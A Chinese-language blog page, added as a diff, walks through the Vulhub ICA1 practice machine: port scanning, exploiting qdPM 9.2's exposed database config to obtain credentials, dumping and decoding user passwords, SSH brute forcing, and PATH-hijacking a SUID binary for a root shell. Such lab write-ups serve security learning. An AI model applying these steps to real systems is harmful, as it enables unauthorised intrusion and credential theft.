@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Vulhub ICA1 靶场 | w8nn9z Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="Vulhub ICA1 靶场 - w8nn9z Blog">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/posts/penetration/vulhubica1/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.12a5629d0be5f885fd946d77257e55f74027ed2a35144a29e2db13f8f62b5f35.css" integrity="sha256-EqVinQvl&#43;IX9lG13JX5V90An7So1FEop4tsT&#43;PYrXzU=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/penetration/vulhubica1/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="w8nn9z Blog (Alt + H)">w8nn9z Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/search" title="搜索 (Alt &#43; /)" accesskey=/>
+                    <span>搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/posts" title="文章">
+                    <span>文章</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/archives" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about" title="关于">
+                    <span>关于</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Vulhub ICA1 靶场
+    </h1>
+    <div class="post-meta"><span title='2025-09-24 00:00:00 +0000 UTC'>September 24, 2025</span>
+
+</div>
+  </header> 
+
+  <div class="post-content"><p>先配置一下网络，NAT模式，初始化界面按e进入编辑模式，将 ro（只读）修改为 rw（读写），并且在参数末尾添加<code>signie init=/bin/bash</code>，使其进入单用户模式，再按下<code>ctrl+x</code>重启，<code>ip a</code>查看网卡，发现是ens33进入网络配置文件进行修改：<code>vim /etc/network/interfaces</code>，将ep0s17改为ens33，最后再次重启完成配置</p>
+<p>nmap扫描开放端口及服务：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap 61.139.2.0/24
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 61.139.2.134
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00052s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">997</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh
+</span></span><span style="display:flex;"><span>80/tcp   open  http
+</span></span><span style="display:flex;"><span>3306/tcp open  mysql
+</span></span></code></pre></div><p>访问web服务：</p>
+<p><img alt="alt" loading="lazy" src="/images/Vulhub/2.png"></p>
+<p>qdPM9.2，搜索一下对应版本漏洞，发现存在敏感信息泄露的问题：https://www.exploit-db.com/exploits/50176</p>
+<p>访问<code>http://127.0.0.1:8085/core/config/databases.yml</code>，获取数据库配置yml文件：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yml" data-lang="yml"><span style="display:flex;"><span><span style="color:#f92672">all</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">doctrine</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">class</span>: <span style="color:#ae81ff">sfDoctrineDatabase</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">param</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">dsn</span>: <span style="color:#e6db74">&#39;mysql:dbname=qdpm;host=localhost&#39;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">profiler</span>: <span style="color:#66d9ef">false</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">username</span>: <span style="color:#ae81ff">qdpmadmin</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">password</span>: <span style="color:#e6db74">&#34;&lt;?php echo urlencode(&#39;UcVQCMQk2STVeS6J&#39;) ; ?&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">attributes</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">quote_identifier</span>: <span style="color:#66d9ef">true</span>  
+</span></span></code></pre></div><p>mysql远程连接到qdpadmin用户：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ mysql -u qdpmadmin -h 61.139.2.134 -p
+</span></span><span style="display:flex;"><span>Enter password: UcVQCMQk2STVeS6J
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Welcome to the MariaDB monitor.  Commands end with ; or <span style="color:#ae81ff">\g</span>.
+</span></span><span style="display:flex;"><span>Your MySQL connection id is <span style="color:#ae81ff">13</span>
+</span></span><span style="display:flex;"><span>Server version: 8.0.26 MySQL Community Server - GPL
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Type <span style="color:#e6db74">&#39;help;&#39;</span> or <span style="color:#e6db74">&#39;\h&#39;</span> <span style="color:#66d9ef">for</span> help. Type <span style="color:#e6db74">&#39;\c&#39;</span> to clear the current input statement.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>MySQL <span style="color:#f92672">[(</span>none<span style="color:#f92672">)]</span>&gt; 
+</span></span></code></pre></div><p>获取数据库敏感信息：</p>
+<pre tabindex="0"><code>show databases;
+use staff;
+show tables;
+select * from user;
++------+---------------+--------+---------------------------+
+| id   | department_id | name   | role                      |
++------+---------------+--------+---------------------------+
+|    1 |             1 | Smith  | Cyber Security Specialist |
+|    2 |             2 | Lucas  | Computer Engineer         |
+|    3 |             1 | Travis | Intelligence Specialist   |
+|    4 |             1 | Dexter | Cyber Security Analyst    |
+|    5 |             2 | Meyer  | Genetic Engineer          |
++------+---------------+--------+---------------------------+
+
+select * from login;
+
++------+---------+--------------------------+
+| id   | user_id | password                 |
++------+---------+--------------------------+
+|    1 |       2 | c3VSSkFkR3dMcDhkeTNyRg== |
+|    2 |       4 | N1p3VjRxdGc0MmNtVVhHWA== |
+|    3 |       1 | WDdNUWtQM1cyOWZld0hkQw== |
+|    4 |       3 | REpjZVZ5OThXMjhZN3dMZw== |
+|    5 |       5 | Y3FObkJXQ0J5UzJEdUpTeQ== |
++------+---------+--------------------------+
+</code></pre><p>password先base64解码再填入passwords.txt中，将数据库中的用户名以及将首字母改写为小写后的所有用户名写入username.txt中，进行ssh爆破：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">[</span>22<span style="color:#f92672">][</span>ssh<span style="color:#f92672">]</span> host: 61.139.2.134   login: travis   password: DJceVy98W28Y7wLg
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>22<span style="color:#f92672">][</span>ssh<span style="color:#f92672">]</span> host: 61.139.2.134   login: dexter   password: 7ZwV4qtg42cmUXGX
+</span></span></code></pre></div><p>ssh登录dexter用户：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ssh dexter@61.139.2.134 -p <span style="color:#ae81ff">22</span>
+</span></span><span style="display:flex;"><span>dexter@61.139.2.134<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>Linux debian 5.10.0-8-amd64 <span style="color:#75715e">#1 SMP Debian 5.10.46-5 (2021-09-23) x86_64</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The programs included with the Debian GNU/Linux system are free software;
+</span></span><span style="display:flex;"><span>the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
+</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span style="display:flex;"><span>permitted by applicable law.
+</span></span><span style="display:flex;"><span>Last login: Sat Sep <span style="color:#ae81ff">25</span> 08:43:19 <span style="color:#ae81ff">2021</span> from 192.168.1.3
+</span></span><span style="display:flex;"><span>dexter@debian:~$
+</span></span></code></pre></div><p><code>/home/dexter</code>目录下note.txt：</p>
+<pre tabindex="0"><code>It seems to me that there is a weakness while accessing the system.
+As far as I know, the contents of executable files are partially viewable.
+I need to find out if there is a vulnerability or not.
+</code></pre><p>查找suid权限可执行文件：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>/opt/get_access
+</span></span><span style="display:flex;"><span>/usr/bin/chfn
+</span></span><span style="display:flex;"><span>/usr/bin/umount
+</span></span><span style="display:flex;"><span>/usr/bin/gpasswd
+</span></span><span style="display:flex;"><span>/usr/bin/sudo
+</span></span><span style="display:flex;"><span>/usr/bin/passwd
+</span></span><span style="display:flex;"><span>/usr/bin/newgrp
+</span></span><span style="display:flex;"><span>/usr/bin/su
+</span></span><span style="display:flex;"><span>/usr/bin/mount
+</span></span><span style="display:flex;"><span>/usr/bin/chsh
+</span></span><span style="display:flex;"><span>/usr/lib/openssh/ssh-keysign
+</span></span><span style="display:flex;"><span>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span></code></pre></div><p>可以用<code>scp</code>命令将<code>/opt/get_access</code>传到kali上，再用IDA进行静态分析：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ scp dexter@61.139.2.134:/opt/get_access ./
+</span></span></code></pre></div><p>IDA静态分析：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setuid</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setgid</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;cat /root/system.info&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">socket</span>(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Could not create socket to access to the system.&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;All services are disabled. Accessing to the system is allowed only within working hours.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>看到该suid权限程序执行了<code>cat</code>命令，于是可以尝试临时修改环境变量<code>PATH</code>，使该程序先执行指定目录下的<code>cat</code>文件，实现自定义<code>cat</code>命令实现提权：</p>
+<pre tabindex="0"><code>$ echo &#34;/bin/bash&#34; &gt; /tmp/cat
+$ export PATH=/tmp:$PATH
+$ chmod +x /tmp/cat
+$ /usr/get_access
+</code></pre><p>获取root目录下的敏感文件：</p>
+<pre tabindex="0"><code>root@debian:~# /bin/cat /root/root.txt
+ICA{Next_Generation_Self_Renewable_Genetics}
+</code></pre><p>发现travis用户目录下也有一份敏感文件：</p>
+<pre tabindex="0"><code>root@debian:~# /bin/cat /home/travis/user.txt
+ICA{Secret_Project}
+</code></pre>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://localhost:1313/">w8nn9z Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
